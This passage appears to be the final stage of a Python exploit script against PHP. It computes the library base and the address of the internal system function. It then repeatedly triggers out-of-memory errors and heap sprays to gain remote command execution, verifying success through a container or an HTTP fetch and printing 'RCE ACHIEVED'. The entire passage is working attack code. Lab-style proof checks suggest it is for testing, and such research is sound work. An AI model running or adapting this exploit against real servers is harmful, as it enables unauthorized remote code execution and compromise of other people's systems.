        if not libphp_base:
            print(f"    [!] No libphp base (cookie={len(cookie)}B)")
            continue

        zif = libphp_base + zif_offset
        print(f"    libphp_base = {hex(libphp_base)}")
        print(f"    zif_system  = {hex(zif)}")

        # Stage 3
        print("  Stage 3: RCE")
        carrier = profile.get("stage3_carrier", True)
        pads_list = [
            STAGE3_PADS_BOOKWORM,
            STAGE3_PADS_LAB,
        ]

        for htdata_off in htdata_candidates:
            htdata = chunk_base + htdata_off
            for pads in pads_list:
                for spray_try in range(1, retries + 1):
                    rotate(host, port, path, huge_mb)
                    resp = stage3_oom(host, port, path, huge_mb, pads)
                    if not resp or b"Allowed memory size" not in resp:
                        continue
                    time.sleep(0.3)
                    stage3_spray(host, port, path, htdata, zif, cmd_bytes, carrier)
                    time.sleep(0.5)

                    proof = None
                    if args.container:
                        proof = check_proof_container(
                            args.container, args.proof_file, args.docker_cmd)
                    if not proof and args.fetch:
                        proof = check_proof_http(host, port, args.fetch)

                    if proof:
                        print(f"    [+] RCE CONFIRMED: {proof}")
                        print()
                        print("=" * 60)
                        print("[6/6] RCE ACHIEVED")
                        print("=" * 60)
                        print(f"  chunk_base:  {hex(chunk_base)}")
                        print(f"  libphp_base: {hex(libphp_base)}")
                        print(f"  zif_system:  {hex(zif)}")
                        print(f"  htdata:      {hex(htdata)}")
                        print(f"  command:     {args.command}")
                        print(f"  proof:       {proof}")
                        return 0

        # Try non-carrier mode too if carrier failed
        if carrier:
            for htdata_off in htdata_candidates:
                htdata = chunk_base + htdata_off
                for pads in pads_list:
                    rotate(host, port, path, huge_mb)
                    resp = stage3_oom(host, port, path, huge_mb, pads)
                    if not resp:
                        continue
                    time.sleep(0.3)
                    stage3_spray(host, port, path, htdata, zif, cmd_bytes, False)
                    time.sleep(0.5)
                    proof = None
                    if args.container:
                        proof = check_proof_container(
                            args.container, args.proof_file, args.docker_cmd)
                    if not proof and args.fetch:
                        proof = check_proof_http(host, port, args.fetch)
                    if proof:
                        print(f"    [+] RCE CONFIRMED: {proof}")
                        print()
                        print("=" * 60)
                        print("[6/6] RCE ACHIEVED")
                        print("=" * 60)
                        print(f"  chunk_base:  {hex(chunk_base)}")
                        print(f"  libphp_base: {hex(libphp_base)}")
                        print(f"  zif_system:  {hex(zif)}")
                        print(f"  htdata:      {hex(htdata)}")
                        print(f"  command:     {args.command}")
                        print(f"  proof:       {proof}")
                        return 0

        print(f"    [-] Stage 3 failed on attempt {attempt}")

    return 1


if __name__ == "__main__":
    sys.exit(main())
